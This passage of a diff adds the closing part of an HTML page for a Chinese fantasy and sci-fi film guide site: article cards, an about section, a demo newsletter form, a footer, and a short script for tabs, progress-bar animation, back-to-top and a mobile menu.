+      <a class="gd" href="#"><figure><img src="https://picsum.photos/id/1062/460/240" alt="配图" loading="lazy"><span class="cat">拉片</span></figure><div class="tx"><h3>诺兰如何拍“梦”：盗梦空间中 5 个被忽略的空间机关</h3><p>旋转走廊、失重酒店、折叠巴黎——每一场戏的布景，都是剧透剧情的谜面。</p><span class="ft">🕒 9 分钟 · 2.1 万阅读</span></div></a>
+      <a class="gd" href="#"><figure><img src="https://picsum.photos/id/1050/460/240" alt="配图" loading="lazy"><span class="cat">入门</span></figure><div class="tx"><h3>科幻入门 10 部：从硬核物理到诗意废土</h3><p>不想烧脑？想被震撼？想哭？按这份片单，总能找到一扇通往未来的门。</p><span class="ft">🕒 6 分钟 · 4.6 万阅读</span></div></a>
+      <a class="gd" href="#"><figure><img src="https://picsum.photos/id/1074/460/240" alt="配图" loading="lazy"><span class="cat">幕后</span></figure><div class="tx"><h3>没有绿幕的年代：阿凡达如何逼出一台新摄影机</h3><p>为了拍潘多拉，卡梅隆先造了 3D 摄影机、动作捕捉系统与一套虚拟摄影流程。</p><span class="ft">🕒 11 分钟 · 1.8 万阅读</span></div></a>
+      <a class="gd" href="#"><figure><img src="https://picsum.photos/id/1083/460/240" alt="配图" loading="lazy"><span class="cat">漫谈</span></figure><div class="tx"><h3>为什么暗黑童话总在雨天发生？——论潮湿的美学</h3><p>潘神的迷宫、地狱男爵、水形物语：吉尔莫·德尔·托罗的怪物，都住在潮湿里。</p><span class="ft">🕒 8 分钟 · 1.4 万阅读</span></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ⑥ 关于 + 订阅 ============ -->
+<section class="us" id="us">
+  <div class="wrap uslay">
+    <div class="us">
+      <div class="eyebrow">About</div>
+      <h2>关于 <u>魔力电影网</u></h2>
+      <p><b class="kw">魔力电影网</b>（molidianyingwang-cn.github.io）是一个聚焦<b>奇幻、魔法、科幻与动画电影</b>的垂直导航与学习站点。我们相信，最好的特效不是技术，而是让观众愿意相信的那个“世界”。</p>
+      <div class="feats">
+        <div><s>🧙</s><span>魔法片库：按“魔法体系”而非“国家”分类</span></div>
+        <div><s>🔥</s><span>魔力热榜：用“魔力值”替代单纯播放量</span></div>
+        <div><s>🗺</s><span>世界观专题：中土、魔法宇宙、赛博、吉卜力</span></div>
+        <div><s>🎬</s><span>观影指南：片单 + 拉片 + 幕后，拒绝剧透式影评</span></div>
+        <div><s>📱</s><span>移动端自适应：手机、平板、电脑一致沉浸</span></div>
+      </div>
+      <a style="display:inline-flex;align-items:center;gap:9px;padding:16px 32px;border-radius:15px;background:linear-gradient(120deg,var(--violet),var(--fuchsia));color:#fff;font-weight:960;font-size:15px;box-shadow:0 14px 32px rgba(123,77,255,.38)" href="https://molidianyingwang-cn.github.io/">🌐 访问 molidianyingwang-cn.github.io</a>
+    </div>
+    <div class="sub">
+      <h3>📮 订阅魔力简报</h3>
+      <p>每月一封：一个魔法世界 + 三部必看影片 + 一篇幕后长文。不谈八卦，只谈光影。</p>
+      <form class="inpg" onsubmit="event.preventDefault();alert('订阅成功！（演示功能）')">
+        <input type="email" placeholder="your@email.com" required aria-label="邮箱地址">
+        <button type="submit">立即订阅</button>
+      </form>
+      <div class="chips"><i># 中土世界</i><i># 魔法宇宙</i><i># 赛博朋克</i><i># 吉卜力</i><i># 视效解析</i></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="wrap">
+    <div class="fg">
+      <div class="fo">
+        <a class="logo" href="#top"><s>魔力电影网</s></a>
+        <p>魔力电影网（molidianyingwang-cn.github.io）专注奇幻、魔法、科幻与动画电影的导航、片单与观影研究，是影迷进入魔法世界的入口。</p>
+        <div class="socs"><a href="#" aria-label="邮件">✉</a><a href="#" aria-label="RSS">📰</a><a href="#" aria-label="豆瓣">📖</a><a href="#" aria-label="GitHub">🐙</a></div>
+      </div>
+      <div class="fcol"><h4>魔法分类</h4><a href="#">史诗奇幻</a><a href="#">魔法校园</a><a href="#">硬科幻</a><a href="#">暗黑童话</a><a href="#">动画奇幻</a></div>
+      <div class="fcol"><h4>研究方法</h4><a href="#">世界观拆解</a><a href="#">视效解析</a><a href="#">配乐研究</a><a href="#">拉片笔记</a></div>
+      <div class="fcol"><h4>关于本站</h4><a href="#">站点简介</a><a href="#">观影年表</a><a href="#">投稿译介</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="copy">
+      © 2026 <b>魔力电影网</b> · 网站网址：https://molidianyingwang-cn.github.io/<br>
+      本站为奇幻、魔法、科幻与动画电影的非商用导航、索引与学习资料分享平台，所涉影片版权归原作者及发行方所有。
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+// 进度条动画（交叉观察器）
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e){if(e.isIntersecting){
+    e.target.querySelectorAll('i[data-w]').forEach(function(i){i.style.width=i.dataset.w+'%'});
+    io.unobserve(e.target);
+  }});
+},{threshold:.25});
+document.querySelectorAll('i[data-w]').forEach(function(i){io.observe(i.parentElement.parentElement)});
+// 标签页
+document.querySelectorAll('#tabs b').forEach(function(b){
+  b.addEventListener('click',function(){
+    document.querySelectorAll('#tabs b').forEach(function(x){x.classList.remove('on')});
+    document.querySelectorAll('.pan').forEach(function(p){p.classList.remove('on')});
+    b.classList.add('on');
+    document.getElementById(b.dataset.t).classList.add('on');
+  });
+});
+// 回到顶部
+var t=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){t.classList[window.scrollY>600?'add':'remove']('show')});
+t.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+// 移动端菜单
+var ham=document.getElementById('ham'),links=document.getElementById('links');
+ham.addEventListener('click',function(){links.classList.toggle('open');ham.textContent=links.classList.contains('open')?'✕':'☰'});
+links.addEventListener('click',function(e){if(e.target.tagName==='A'){links.classList.remove('open');ham.textContent='☰'}});
+</script>
+</body>
+</html>
